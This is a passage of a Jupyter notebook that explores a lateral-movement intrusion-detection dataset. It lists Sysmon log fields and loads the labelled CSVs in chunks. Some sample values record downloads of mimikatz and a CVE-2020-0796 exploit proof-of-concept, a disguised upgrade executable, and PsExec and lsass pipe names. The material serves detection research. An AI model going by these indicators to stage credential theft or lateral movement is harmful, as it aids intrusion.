'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Windows\\\\System32\\\\SHELL32.dll+981b0|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b2aac|C:\\\\Windows\\\\System32\\\\TwinUI.dll+12d4e1|C:\\\\Windows\\\\System32\\\\TwinUI.dll+12dfcf|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+5eab4|c:\\\\windows\\\\system32\\\\termsrv.dll+a1087|c:\\\\windows\\\\system32\\\\termsrv.dll+6aa58|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+7a593|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+d9f41|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+62d4c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4a274|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4918d|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+49a3b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+310ac|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+3152c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1ae1c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1c67b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+43a2a|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1d34e|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1ecb9|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a7194|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2b860|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+6b246|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+1c213|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+ce6a3b|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+17cade|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+18641d|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+17ef16|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c992c4|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+18689b|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+189d3c|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c95f5f|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c99fad|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+184c5b|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c7dd7e|C:\\\\Windows\\\\System32\\\\ucrtbase.dll+1fb80|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+6e871', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+78b1|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+74d7|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+12fce|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+15b2b|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+1011d|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+104a0|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+13952|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+16139|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+16c03|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+1a70e|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+14fc2|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+c526|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+11927|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+b91a|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+7a593|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+d9f41|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+62d4c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4a274|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4918d|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+49a3b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+310ac|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+3152c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1ae1c', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Tools\\\\ProcessExplorer\\\\procexp64.exe+a9381|C:\\\\Tools\\\\ProcessExplorer\\\\procexp64.exe+836d5|C:\\\\Tools\\\\ProcessExplorer\\\\procexp64.exe+c799c|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+55e675|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+55e1a6|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+6b453|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+8e8530|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781']\n",
      "SourceUser                     ['nan', 'NT AUTHORITY\\\\SYSTEM', '0', 'ATTACKRANGE\\\\Administrator', 'ATTACKRANGE\\\\REED_SCHMIDT', 'STEFANIA\\\\altinistef', '0.0', 'NT AUTHORITY\\\\NETWORK SERVICE', 'STEFANIA\\\\altinitat']\n",
      "TargetUser                     ['nan', 'NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\SYSTEM', '0', 'ATTACKRANGE\\\\JULIUS_PITTS', 'Window Manager\\\\DWM-2', 'ATTACKRANGE\\\\Administrator', 'Window Manager\\\\DWM-1', 'ATTACKRANGE\\\\REED_SCHMIDT', 'STEFANIA\\\\altinistef']\n",
      "TargetFilename                 ['C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\vhjSBRkxzNz.exe', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Temp\\\\a4-0\\\\Microsoft.PowerShell.Commands.Management.dll', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\Microsoft Office 2007 (preactivated) (michaelrizzochessman upl)\\\\Microsoft Office 2007 (preactivated)\\\\InfoPath.en-us\\\\InfLR.cab', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.248.1127.0001\\\\api-ms-win-core-datetime-l1-1-0.dll', 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.YourPhone_1.22092.214.0_x64__8wekyb3d8bbwe\\\\System.Security.Cryptography.ProtectedData.dll', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\FileSyncConfig.exe', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\api-ms-win-crt-convert-l1-1-0.dll', 'C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office12\\\\MSCAL.OCX', 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.YourPhone_1.22102.229.0_x64__8wekyb3d8bbwe\\\\WinRT.Runtime.dll', 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.YourPhone_1.22092.214.0_x64__8wekyb3d8bbwe\\\\YourPhone.Background.CX.dll']\n",
      "CreationUtcTime                ['08:16.8', '42:06.2', '51:12.7', '11:55.5', '47:33.7', '06:10.0', '25:38.0', '26:31.3', '41:28.6', '08:23.1']\n",
      "EventType                      ['nan', 'SetValue', 'DeleteValue', '0', 'CreatePipe', 'ConnectPipe', 'DeleteKey', 'CreateKey', '0.0']\n",
      "TargetObject                   ['\\\\REGISTRY\\\\A\\\\{09e83960-58de-ea93-2257-7c2a713e7f37}\\\\Root\\\\InventoryApplicationFile\\\\w64-arm.exe|696b1b05915f74c5\\\\LowerCaseLongPath', 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\AarSvc_733e5\\\\Start', '\\\\REGISTRY\\\\A\\\\{4bd6ec6f-a019-b54b-afc0-98fdee1df460}\\\\Root\\\\InventoryApplicationFile\\\\grooveclean.exe|eed41384aa045e57\\\\LowerCaseLongPath', 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\UnistoreSvc_6a769\\\\ImagePath', 'HKCR\\\\XEV.FailSafeApp\\\\shell\\\\open\\\\command\\\\(Default)', '\\\\REGISTRY\\\\A\\\\{f05f8bf2-6c69-6f8c-edae-7b502c9889fe}\\\\Root\\\\InventoryApplicationFile\\\\pwahelper.exe|bd9fdfe0c9c54c3b\\\\LowerCaseLongPath', '\\\\REGISTRY\\\\A\\\\{4bd6ec6f-a019-b54b-afc0-98fdee1df460}\\\\Root\\\\InventoryApplicationFile\\\\soundrec.exe|2f356917aec13029\\\\BinProductVersion', 'HKCR\\\\Access.MDBFile\\\\shell\\\\Open\\\\command\\\\command', '\\\\REGISTRY\\\\A\\\\{ddc2ac6d-721d-98e0-dd32-f4fb28834614}\\\\Root\\\\InventoryApplicationFile\\\\waasmedicagent.e|464a27937f95d7d6\\\\BinProductVersion', 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\CDPUserSvc_681ac\\\\ImagePath']\n",
      "Details                        ['c:\\\\program files (x86)\\\\common files\\\\microsoft shared\\\\source engine\\\\ose.exe', 'C:\\\\PROGRA~1\\\\COMMON~1\\\\MICROS~1\\\\OFFICE12\\\\MSOXMLMF.DLL', 'c:\\\\program files\\\\windowsapps\\\\microsoft.windowscommunicationsapps_16005.14326.21256.0_x64__8wekyb3d8bbwe\\\\hxoutlook.exe', '05/06/2044 13:46', 'QWORD (0x01d7e0d8-0x766dfba1)', 'c:\\\\users\\\\altinistef.stefania\\\\appdata\\\\local\\\\microsoft\\\\edgewebview\\\\application\\\\108.0.1462.54\\\\cookie_exporter.exe', '{5402e5ea-1bdd-4390-82be-e108f1e634f5}', 'C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office12\\\\MSCAL.OCX', '2000.19081.1301.0', 'c:\\\\users\\\\altinitat.stefania\\\\appdata\\\\local\\\\microsoft\\\\onedrive\\\\22.227.1030.0001\\\\onedrivesetup.exe']\n",
      "PipeName                       ['nan', '\\\\PSHost.132821900438425963.3392.DefaultAppDomain.wsmprovhost', '\\\\PSHost.132815753751826733.5348.DefaultAppDomain.powershell', '\\\\srvsvc', '\\\\PSEXESVC-WIN-HOST-987-3456-stdout', '0', '<Anonymous Pipe>', '\\\\lsass', '\\\\PSEXESVC-WIN-HOST-987-3456-stderr', '\\\\PSHost.132815753754614208.344.DefaultAppDomain.wsmprovhost']\n",
      "QueryName                      ['i.pinimg.com', 'p33243.cedexis-test.com', '_ldap._tcp.gc._msdcs.stefania.local.', 'js-sec.indexww.com', '_ldap._tcp.dc._msdcs.stefania.local.', 's-f.scribdassets.com', 'match.prod.bidr.io', 'www.amycraft.com', 'aorta.clickagy.com', 'p20313.cedexis-test.com']\n",
      "QueryStatus                    ['nan', '9003.0', '9852.0', '9002.0', '9701.0', '9501.0', '1223.0', '0.0', '1460.0']\n",
      "QueryResults                   ['type:  5 googlehosted.l.googleusercontent.com;142.250.184.225;', 'type:  5 fp-afd-nocache-ccp.afd.azureedge.net;type:  5 star-azureedge-prod.trafficmanager.net;type:  5 dual.part-0032.t-0009.t-msedge.net;type:  5 global-entry-afdthirdparty-fallback.trafficmanager.net;type:  5 dual.part-0032.t-0009.fbs1-t-msedge.net;type:  5 part-0032.t-0009.fbs1-t-msedge.net;::ffff:13.107.219.60;::ffff:13.107.227.60;', 'type:  5 s3-1-w.amazonaws.com;type:  5 s3-w.us-east-1.amazonaws.com;52.217.163.17;54.231.202.209;52.217.100.12;54.231.168.81;52.216.170.59;52.216.160.187;52.216.83.80;3.5.8.13;', 'type:  5 sp-20200324121949090600000008-54648268.eu-west-1.elb.amazonaws.com;99.81.246.120;52.210.252.249;', 'type:  5 pool-eu.zagreb.iponweb.net;type:  5 elb-aws-fr-zagreb-1702672115.eu-central-1.elb.amazonaws.com;3.124.154.128;3.120.107.35;35.157.242.113;3.123.145.89;18.158.209.170;54.93.149.219;', '20.253.178.251;', 'type:  5 sysinternalvmss.trafficmanager.net;type:  5 sysazlive.uksouth.cloudapp.azure.com;20.49.223.105;', 'type:  5 youtube-ui.l.google.com;142.250.186.142;172.217.16.142;142.250.186.46;172.217.18.14;142.250.181.238;172.217.16.206;142.250.186.110;172.217.18.110;142.250.74.206;142.250.186.78;216.58.212.142;142.250.186.174;142.250.184.206;142.250.184.238;142.250.185.110;142.250.185.142;', '192.229.220.206;', 'type:  5 cdn.jsdelivr.net.cdn.cloudflare.net;104.16.87.20;104.16.88.20;104.16.89.20;104.16.86.20;104.16.85.20;']\n",
      "IsExecutable                   ['nan', 'True', '0', 'False', '0.0']\n",
      "Archived                       ['false - insufficient disk space', 'nan', '0.0', '0']\n",
      "SourceProcessGuid              ['{a190aab6-c2b0-63bd-a800-000000001d00}', 'nan', '{a190aab6-fdd9-63be-7800-000000002100}', '{a190aab6-274b-6389-0b02-000000001600}', '{a190aab6-8a99-63be-7d00-000000001e00}', '{a190aab6-53ba-6382-7f00-000000001500}', '{a190aab6-850e-6393-0600-000000001800}', '{a190aab6-f96c-63be-7600-000000003700}', '{a190aab6-c3c3-63b9-0600-000000002c00}', '{a190aab6-8bdd-638e-0900-000000001c00}']\n",
      "TargetProcessGuid              ['{a190aab6-f9f7-639a-3000-000000001a00}', '{a190aab6-d321-63be-2e00-000000001f00}', '{a190aab6-8e9b-6387-2800-000000001400}', '{a190aab6-9977-638b-a600-000000001900}', '{a190aab6-5fbe-63bf-2200-000000001f00}', '{a190aab6-38e7-639c-5200-000000002100}', '{a190aab6-f9f6-639a-2d00-000000001a00}', '{a190aab6-867a-639b-1c00-000000001a00}', '{a190aab6-08f0-639b-5001-000000001a00}', '{a190aab6-f872-6392-2800-000000001800}']\n",
      "NewThreadId                    ['6080.0', '4684.0', '3684.0', '3576.0', '3056.0', '5484.0', '2940.0', '2064.0', '4380.0', '5820.0']\n",
      "StartAddress                   ['nan', '0x0000000006412C60', '0x00007FFDAC7FAAB0', '0x000001CA481D0000', '0x0000018CD0C80000', '0x00007FFF19BEACA0', '0xFFFFC53DDB0A20D0', '0x00007FF88266ACA0', '0xFFFFD6A19A4E20D0', '0x000001C31A9B0000']\n",
      "StartModule                    ['nan', 'C:\\\\Windows\\\\System32\\\\KERNELBASE.dll', '0', 'C:\\\\Windows\\\\SYSTEM32\\\\KERNELBASE.dll', '0.0', '-']\n",
      "StartFunction                  ['nan', 'CtrlRoutine', '0', '0.0', '-']\n",
      "PreviousCreationUtcTime        ['42:30.8', '00:04.5', '43:30.9', '50:25.8', '44:06.5', '56:39.2', '48:15.4', '52:34.2', '42:06.8', '44:06.2']\n",
      "Hash                           ['MD5=99F782ED1605973AC850F734470E2311,SHA256=ABFC0E354BA013FE02711AB3D686F1E49BF182D17073C70BE74F9E37B778F474,IMPHASH=481F47BBB2C9C21E108D65F52B04C448', 'MD5=01BBA0649080C1959F083FA0EA5FBDB0,SHA256=3931AC215FE401B0A13DF36978D97544A5F1DF32396F34F3879582C5C19A2460,IMPHASH=00000000000000000000000000000000', 'MD5=E52AC781C403DABE22DFA16AEF8491BE,SHA256=033B81744E0BD4219A4D698894B8403BB67B525C96049CBFEF34677D4D6FC85C,IMPHASH=012373288A4A55BF933694E80D94BDB7', 'MD5=BD35132C7A1E78364F4B908EBAF8CB5D,SHA256=57DC27269669402152518DC7683E0A9CC372A3C3125EFE1C7ECD8E8516F556F3,IMPHASH=4FBD131B43ADA427B7988D9DAC05090E', 'MD5=A285919B3737ED691E1D029E36213050,SHA256=E6901E8423DA3E54BAB25F7C90F60D3979BFA5BB61BCC46059662736253B8C72,IMPHASH=BE5599AD751321F04C6F8A14BFA32AC6', 'MD5=F3855C0D8C5F35E8E88FC79350360006,SHA256=44C08ECDB55F7B492D373BE399273CFE52961715C93B92AC96D9516172B604D0,IMPHASH=481F47BBB2C9C21E108D65F52B04C448', 'MD5=EFA2F8F73B3559711149DFDEB8BC288E,SHA256=EF5CF80C8448BF0907C634A3251CC348B1D36BB5AD8F31F23B11D12AA7F63BCB,IMPHASH=807DBAB54231983BC1DD8E3031EBDF02', 'MD5=9A4A82A513DBFB4F53390359588D86F1,SHA256=98B1F9C3BB1BD9470BEFB6672D52AE67D25E8A8C10E2310E91988AD64B91A485,IMPHASH=00000000000000000000000000000000', 'MD5=4047530ECBC0170039E76FE1657BDB01,SHA256=82254025D1B98D60044D3AEB7C56EED7C61C07C3E30534D6E05DAB9D6C326750,IMPHASH=00000000000000000000000000000000', 'MD5=AB0BBBCBF445146CE71346DF41BB01AD,SHA256=F01468012F5DE0FDBFA71202786085E7EF15237C80C9A9FAAA5C30A3188CF385,IMPHASH=38E28A24C9F1C4F16971D2B60591AF6C']\n",
      "Contents                       ['Ã\\x83Â\\xa0Ã\\x82Â¨Ã\\x82Â¹', 'nan', '#!/usr/bin/make -f # -*- makefile -*- # Sample debian/rules that uses debhelper. # This file was originally written by Joey Hess and Craig Small. # As a special exception, when this file is copied by dh-make into a # dh-make output file, you may use that output file without restriction. # This special exception was added by Craig Small in version 0.37 of dh-make.  # Uncomment this to turn on verbose mode. #export DH_VERBOSE=1  %: \\tdh $@  ', 'PsTools Version in this package: 2.48  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\PSTools.zip  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://www.researchgate.net/  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://github.com/ZecOps/CVE-2020-0796-RCE-POC  HostUrl=https://codeload.github.com/ZecOps/CVE-2020-0796-RCE-POC/zip/refs/heads/master  ', '[ZoneTransfer]  ZoneId=3  HostUrl=http://192.168.1.28/windows_11_free_upgrade.exe  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://github.com/ParrotSec/mimikatz  HostUrl=https://codeload.github.com/ParrotSec/mimikatz/zip/refs/heads/master  ', 'README.md ']\n",
      "ID                             ['0.0', 'nan', '0', 'GetConfigurationOptions']\n",
      "Label                          ['0', '1', '2']\n",
      "Unnamed: 0                     ['1716829', '533069', '209475', '982169', '450351', '860392', '231405', '286696', '1559146', '1180930']\n"
     ]
    }
   ],
   "source": [
    "# Adjust column width as needed (e.g., 15 for first column)\n",
    "column_width = 30\n",
    "for i, j in unique_counts.items():\n",
    "    print(f\"{i.ljust(column_width)} {j}\")\n",
    "print('\\n\\n\\n')\n",
    "for i, j in first_10_unique_values.items():\n",
    "    print(f\"{i.ljust(column_width)} {j}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 1/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential_processed\\LMD-2022 [870K Elements][Labelled].csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 2/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential_processed\\LMD-2023 [1.75M Elements][Labelled]checked.csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 10...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 11...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 12...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 13...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 14...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 15...\n"
     ]
    },
    {
     "name": "stderr",
